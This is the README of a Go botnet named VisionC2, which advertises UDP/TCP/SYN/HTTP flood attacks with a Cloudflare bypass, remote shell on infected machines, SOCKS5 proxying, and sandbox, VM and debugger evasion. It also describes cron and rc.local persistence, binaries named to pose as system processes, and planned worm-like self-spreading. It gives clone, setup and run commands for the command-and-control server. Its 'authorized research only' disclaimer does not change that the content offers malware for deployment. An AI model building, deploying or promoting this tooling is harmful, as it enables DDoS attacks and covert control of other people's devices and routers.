
<div align="center">

# ☾℣☽ision - **Advanced Go-Based Botnet**  

**DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture • TUI View**

![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)
![License](https://img.shields.io/badge/License-GNU%20GPLv3-yellow?style=for-the-badge)

</div>

![Animation](https://github.com/user-attachments/assets/4475a3a1-b3a5-4bb3-b00a-b30e88210dcd)

---
## ✨ Features

### Bot Capabilities
- **Layer 4 Attacks** — UDP, TCP, SYN, ACK, GRE, and DNS flood methods
- **Layer 7 Attacks** — HTTP/HTTPS/TLS with **HTTP/2 fingerprinting** and **Cloudflare UAM bypass**
- **Remote Execution** — **Interactive per-bot shell** and **fire-and-forget broadcast commands**
- **SOCKS5 Proxy** — Convert any agent into a **high-performance SOCKS5 proxy server** on demand

### CNC & TUI Interface
- **Full-screen TUI** (Terminal User Interface) for Command & Control
- **Real-time dashboard** with bot management and live statistics
- **Visual attack builder** with detailed metrics
- **Single-Agent Control** — fully interactive per-bot shell interface
- **Broadcast Shell Execution** — Powerful filters by **architecture**, **RAM amount**, **bot count**, and more
- **Built-in SOCKS5 Proxy Manager** — One-click start/stop per bot or in bulk operations

### Encryption & Stealth
- **TLS 1.3** with **Perfect Forward Secrecy**
- **HMAC challenge-response** authentication system
- **Multi-layer obfuscation** — RC4 → XOR → byte substitution → MD5
- **Anti-analysis & evasion** — **Sandbox detection** • **VM detection** • **Debugger detection**
---
## 🚀 Quick Start

### Prerequisites
```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Go 1.23+ → https://go.dev/dl/
```

### Installation
```bash
git clone https://github.com/Syn2Much/VisionC2.git

cd VisionC2
chmod +x *

python3 setup.py
# CNC will be built as ./server in ./VisionC2 root directory. Binaries will be built to ./VisionC2/bins
```

## ⚙️ Configuration

Code changes are made automatically via an interactive setup 

Review `setup_config.txt` after running to see current:
* C2 address & ports
* Magic code & encryption keys
* Generated 4096-bit TLS certificates

---


### Running the C2
**Recommended (TUI Mode)**
```bash
screen ./server
# Press Ctrl+A then D to detach from screen session
# Reattach with: screen -r
```

**Telnet/Multi-User Mode (Legacy)**
```bash
screen ./server --split
# Then connect with: nc <c2-ip> <admin-port>
# Type "spamtec" to trigger hidden login portal
# Uses users.json database for authentication

# Detach from screen: Ctrl+A then D
# Reattach: screen -r
```
[COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  

Bot binaries are automatically cross-compiled to `bot/bins/`.


## 🧬 Supported Architectures & Stealth Binaries

| Binary Name   | Architecture | Target Platforms                     |
|---------------|--------------|--------------------------------------|
| `kworkerd0`   | x86 (386)    | Linux 32-bit                         |
| `ethd0`       | x86_64       | Linux 64-bit (most common)           |
| `mdsync1`     | ARMv7        | Raspberry Pi 2/3, older ARM devices  |
| `ip6addrd`    | ARM64        | Raspberry Pi 4, modern Android, AWS Graviton |
| `httpd`       | MIPS         | Routers, IoT devices                 |
| `...`         | +12 more     | PPC64, RISC-V, s390x, loong64, etc.  |

All binaries are UPX-packed, stripped, and named to blend with legitimate system processes.

## Architecture Overview

```
[ Admin ] → [ C2 Server/TUI ] ↔ [ Bot Agents ]
                    │              │
            TLS 1.3 │              ├─ Persistence (cron/rc.local)
            HMAC Auth │            ├─ Multi-layer C2 Resolution
                    │              ├─ Sandbox Detection
                    │              └─ Encrypted Command Loop
                    │
                    └─ Issues HMAC challenge
                       Verifies response
                       Queues commands
```

**Authentication Flow**
1. Bot decrypts embedded C2 config (Base64 → XOR → RC4 → Byte Sub → MD5)
2. Resolves C2 via DoH TXT / DNS A records
3. TLS 1.3 handshake → HMAC challenge → MD5(ch + MAGIC + ch)
4. Successful auth → encrypted command loop

## 📜 Documentation

| File                    | Description                                      |
|-------------------------|--------------------------------------------------|
| [USAGE.md](Docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
| [COMMANDS.md](Docs/COMMANDS.md) | Complete CNC command reference              |
| [CHANGELOG.md](Docs/CHANGELOG.md) | Version history and breaking changes         |

## 🛣️ Roadmap

**In Progress**
- Finish TUI Updates
- Enhanced daemonization
- Competitor locker / killer module

**Planned**
- Auto-generated DGA fallback domains
- Self-replication & worm-like spreading
- Single-instance port takeover

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

This software is provided strictly for educational, research, and authorized penetration testing purposes. The authors are not responsible for any misuse or legal consequences resulting from its use.

## 📜 License
GNU General Public License v3.0 — see [LICENSE](LICENSE)

## Support
- Open a GitHub Issue for bugs or feature requests
- Detailed documentation in `USAGE.md`
- Contact: `dev@sinners.city`

---
